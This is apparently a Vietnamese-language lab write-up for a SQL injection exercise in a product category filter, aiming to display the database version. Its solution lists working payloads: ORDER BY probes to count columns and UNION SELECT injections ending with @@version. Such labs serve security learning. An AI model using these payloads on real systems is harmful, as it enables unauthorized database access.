# Đầu bài cho biết:
- Ứng dụng có lỗ hổng SQL injection trong bộ lọc danh mục sản phẩm.
- Có thể sử dụng tấn công UNION để truy xuất kết quả từ truy vấn được tiêm vào.

# Yêu cầu:
- Hiển thị chuỗi phiên bản cơ sở dữ liệu.

# Solution:
' ORDER BY 1--

' ORDER BY 1# -> LỖI

' ORDER BY 1%23 (%23 = #)

' ORDER BY 2%23

' ORDER BY 3%23 -> LỖI

=> Có 2 vị trí cột


' UNION SELECT NULL, NULL%23

' UNION SELECT 'a', 'aa'%23

' UNION SELECT 'Version', @@version%23
